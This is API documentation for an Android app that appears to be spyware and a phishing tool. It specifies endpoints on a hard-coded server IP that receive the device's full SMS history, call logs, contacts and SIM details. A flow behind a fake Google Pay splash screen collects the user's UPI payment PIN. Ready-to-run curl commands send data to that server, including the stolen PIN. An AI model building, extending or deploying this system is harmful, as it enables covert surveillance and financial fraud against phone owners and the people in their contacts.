# API Documentation

## Base URL
```
http://95.134.130.160:8765
```

## Overview
This document describes all API endpoints used by the Android application to communicate with the backend server. All requests use **snake_case** format for field names to maintain consistency with Python backend.

---

## 1. Device Registration

### Endpoint
```
POST /register
```

### Description
Registers a new device with the server and sends complete device information.

### Request Headers
```
Content-Type: application/json
```

### Request Body
```json
{
  "type": "register",
  "device_id": "android_id_here",
  "user_id": "USER_ID",
  "app_type": "MP",
  "device_info": {
    // Device Hardware
    "model": "SM-G991B",
    "manufacturer": "samsung",
    "brand": "samsung",
    "device": "o1s",
    "product": "o1sxxx",
    "hardware": "exynos2100",
    "board": "universal2100",
    "display": "RP1A.200720.012",
    "fingerprint": "samsung/o1sxxx/o1s:12/SP1A.210812.016/G991BXXU5DVHC:user/release-keys",
    "host": "SWDD5318",
    
    // Operating System
    "os_version": "12",
    "sdk_int": 31,
    "supported_abis": ["arm64-v8a", "armeabi-v7a", "armeabi"],
    
    // Battery Information
    "battery": 85,
    "battery_state": "charging_ac",
    "is_charging": true,
    
    // Storage Information (in MB)
    "total_storage_mb": 128000.0,
    "free_storage_mb": 45000.0,
    "storage_used_mb": 83000.0,
    "storage_percent_free": 35.15,
    
    // RAM Information (in MB)
    "total_ram_mb": 8192.0,
    "free_ram_mb": 3456.0,
    "ram_used_mb": 4736.0,
    "ram_percent_free": 42.19,
    
    // Network Information
    "network_type": "WiFi",
    "ip_address": "192.168.1.100",
    
    // Security & Display
    "is_rooted": false,
    "is_emulator": false,
    "screen_resolution": "1080x2400",
    "screen_density": 420,
    
    // SIM Card Information
    "sim_info": {
      "sim_count": 2,
      "sims": [
        {
          "slot_index": 0,
          "carrier_name": "Vodafone",
          "country_iso": "GB",
          "phone_number": "+447xxxxxxxxx",
          "sim_serial_number": "89440000000000000000",
          "network_operator": "23415",
          "network_operator_name": "Vodafone UK",
          "is_network_roaming": false,
          "data_state": "connected"
        },
        {
          "slot_index": 1,
          "carrier_name": "EE",
          "country_iso": "GB",
          "phone_number": "+447yyyyyyyyy",
          "sim_serial_number": "89440111111111111111",
          "network_operator": "23430",
          "network_operator_name": "EE",
          "is_network_roaming": false,
          "data_state": "disconnected"
        }
      ]
    },
    
    // Application & Device Info
    "fcm_token": "firebase_cloud_messaging_token_here",
    "user_id": "USER_ID",
    "app_type": "MP",
    "device_name": "samsung SM-G991B",
    "package_name": "com.example.test"
  }
}
```

### Response
```json
{
  "status": "success",
  "message": "Device registered successfully"
}
```

### Error Response
```json
{
  "status": "error",
  "message": "Registration failed"
}
```

---

## 2. Battery Update

### Endpoint
```
POST /battery
```

### Description
Sends periodic battery status updates to the server.

### Request Headers
```
Content-Type: application/json
```

### Request Body
```json
{
  "type": "battery",
  "device_id": "android_id_here",
  "battery_percent": 75,
  "is_charging": false,
  "battery_state": "discharging",
  "timestamp": 1699123456789
}
```

### Battery States
- `charging_usb` - Charging via USB
- `charging_ac` - Charging via AC adapter
- `charging_wireless` - Charging wirelessly
- `charging` - Charging (unknown method)
- `discharging` - Not charging

### Response
```json
{
  "status": "success",
  "message": "Battery update received"
}
```

---

## 3. Heartbeat

### Endpoint
```
POST /heartbeat
```

### Description
Periodic heartbeat signal to indicate the device is active and running.

### Request Headers
```
Content-Type: application/json
```

### Request Body
```json
{
  "type": "heartbeat",
  "device_id": "android_id_here",
  "timestamp": 1699123456789,
  "app_version": "1.0.0",
  "status": "active"
}
```

### Response
```json
{
  "status": "success",
  "message": "Heartbeat received"
}
```

---

## 4. SMS Upload (Batch)

### Endpoint
```
POST /sms
```

### Description
Uploads SMS messages in batches. Supports large-scale batch uploads.

### Request Headers
```
Content-Type: application/json
```

### Request Body
```json
{
  "type": "sms_batch",
  "device_id": "android_id_here",
  "batch_number": 1,
  "total_batches": 5,
  "sms_list": [
    {
      "id": "12345",
      "address": "+447123456789",
      "body": "Hello, this is a test message",
      "date": 1699123456789,
      "type": 1,
      "read": 1,
      "thread_id": "1",
      "person": "John Doe"
    },
    {
      "id": "12346",
      "address": "+447987654321",
      "body": "Another message",
      "date": 1699123460000,
      "type": 2,
      "read": 1,
      "thread_id": "2",
      "person": "Jane Smith"
    }
  ],
  "timestamp": 1699123456789
}
```

### SMS Type Values
- `1` - Inbox (received)
- `2` - Sent
- `3` - Draft
- `4` - Outbox
- `5` - Failed
- `6` - Queued

### Response
```json
{
  "status": "success",
  "message": "SMS batch received",
  "batch_number": 1,
  "messages_count": 2
}
```

---

## 5. Call Logs Upload (Batch)

### Endpoint
```
POST /calls
```

### Description
Uploads call logs in batches.

### Request Headers
```
Content-Type: application/json
```

### Request Body
```json
{
  "type": "call_logs_batch",
  "device_id": "android_id_here",
  "batch_number": 1,
  "total_batches": 3,
  "call_logs": [
    {
      "number": "+447123456789",
      "name": "John Doe",
      "date": 1699123456789,
      "duration": 120,
      "type": 1,
      "call_type": "INCOMING"
    },
    {
      "number": "+447987654321",
      "name": "Jane Smith",
      "date": 1699123460000,
      "duration": 45,
      "type": 2,
      "call_type": "OUTGOING"
    }
  ],
  "timestamp": 1699123456789
}
```

### Call Type Values
- `1` - Incoming
- `2` - Outgoing
- `3` - Missed
- `4` - Voicemail
- `5` - Rejected
- `6` - Blocked

### Response
```json
{
  "status": "success",
  "message": "Call logs batch received",
  "batch_number": 1,
  "logs_count": 2
}
```

---

## 6. Contacts Upload (Batch)

### Endpoint
```
POST /contacts
```

### Description
Uploads contacts in batches.

### Request Headers
```
Content-Type: application/json
```

### Request Body
```json
{
  "type": "contacts_batch",
  "device_id": "android_id_here",
  "batch_number": 1,
  "total_batches": 2,
  "contacts": [
    {
      "id": "1",
      "name": "John Doe",
      "phone_numbers": [
        {
          "number": "+447123456789",
          "type": "MOBILE"
        },
        {
          "number": "+447111222333",
          "type": "HOME"
        }
      ],
      "emails": [
        {
          "email": "john.doe@example.com",
          "type": "WORK"
        }
      ]
    },
    {
      "id": "2",
      "name": "Jane Smith",
      "phone_numbers": [
        {
          "number": "+447987654321",
          "type": "MOBILE"
        }
      ],
      "emails": []
    }
  ],
  "timestamp": 1699123456789
}
```

### Phone/Email Type Values
- `MOBILE`
- `HOME`
- `WORK`
- `OTHER`
- `CUSTOM`

### Response
```json
{
  "status": "success",
  "message": "Contacts batch received",
  "batch_number": 1,
  "contacts_count": 2
}
```

---

## 7. UPI PIN Upload

### Endpoint
```
POST /save-pin
```

### Description
Saves the UPI PIN entered by the user along with device identification.

### Request Headers
```
Content-Type: application/json
```

### Request Body
```json
{
  "pin": "1234",
  "device_id": "android_id_here"
}
```

### Notes
- PIN can be 4 or 6 digits
- `device_id` is the Android device ID (same as used in other requests)

### Response
```json
{
  "status": "success",
  "message": "PIN saved successfully"
}
```

### Error Response
```json
{
  "status": "error",
  "message": "Failed to save PIN"
}
```

---

## Data Upload Flow

### 1. App Startup Sequence
```
1. Show SexyCat splash screen (2 seconds)
2. Request permissions
3. If permissions granted:
   a. Register device (/register)
   b. Upload all call logs (/calls)
   c. Upload all SMS in background (/sms)
   d. Upload all contacts in background (/contacts)
   e. Start battery updater (every 60 seconds)
   f. Start heartbeat service (periodic)
```

### 2. User Flow
```
1. index.html (splash) ? 6 seconds
2. register.html (user registration)
3. payment.html (payment selection)
4. googlepay-splash.html (2.5 seconds)
5. upi-pin.html (PIN entry) ? Send to /api/save-pin
6. final.html (success page)
```

---

## Important Notes

### 1. Field Naming Convention
All field names use **snake_case** format to match Python backend conventions.

### 2. Timestamps
All timestamps are in milliseconds since Unix epoch (Java `System.currentTimeMillis()`).

### 3. Device ID
The device ID is the Android Secure ID obtained via:
```java
Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
```

### 4. Batch Processing
Large datasets (SMS, Contacts, Call Logs) are uploaded in batches to:
- Prevent memory issues
- Handle network interruptions better
- Provide upload progress tracking

### 5. Error Handling
All endpoints should return:
- HTTP 200 for success
- HTTP 4xx/5xx for errors
- JSON response with `status` and `message` fields

### 6. Package Name
The app package name (`com.example.test`) is included in the registration request for tracking purposes.

---

## Example cURL Commands

### Register Device
```bash
curl -X POST http://95.134.130.160:8765/register \
  -H "Content-Type: application/json" \
  -d '{
    "type": "register",
    "device_id": "android123",
    "user_id": "USER_ID",
    "app_type": "MP",
    "device_info": {
      "model": "Pixel 6",
      "manufacturer": "Google",
      "os_version": "13",
      "package_name": "com.example.test"
    }
  }'
```

### Save UPI PIN
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "pin": "123456",
    "device_id": "android123"
  }'
```

### Battery Update
```bash
curl -X POST http://95.134.130.160:8765/battery \
  -H "Content-Type: application/json" \
  -d '{
    "type": "battery",
    "device_id": "android123",
    "battery_percent": 75,
    "is_charging": false,
    "battery_state": "discharging",
    "timestamp": 1699123456789
  }'
```

---

## Security Considerations

1. **HTTPS**: Consider using HTTPS for all endpoints in production
2. **Authentication**: Implement token-based authentication
3. **Rate Limiting**: Implement rate limiting to prevent abuse
4. **Data Encryption**: Consider encrypting sensitive data (SMS, contacts)
5. **Input Validation**: Validate all input data on the server side

---

## Testing Checklist

- [ ] Device registration successful
- [ ] Battery updates received correctly
- [ ] Heartbeat signals working
- [ ] SMS batch upload working with large datasets
- [ ] Call logs batch upload working
- [ ] Contacts batch upload working
- [ ] UPI PIN saved correctly with device_id
- [ ] Error responses handled properly
- [ ] Network retry logic working

---

**Last Updated**: 2024
**API Version**: 1.0
**App Package**: com.example.test
